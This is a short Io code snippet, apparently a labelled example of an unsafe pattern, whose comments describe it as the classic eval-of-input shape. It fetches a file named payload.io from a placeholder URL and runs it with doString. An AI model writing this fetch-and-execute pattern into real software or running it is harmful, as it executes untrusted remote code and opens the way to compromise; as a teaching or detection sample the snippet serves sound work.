// Reads code from a remote source and evaluates it.
// Classic eval(user_input) shape in Io.
url := "http://example.com/payload.io"
src := URL with(url) fetch
Lobby doString(src)
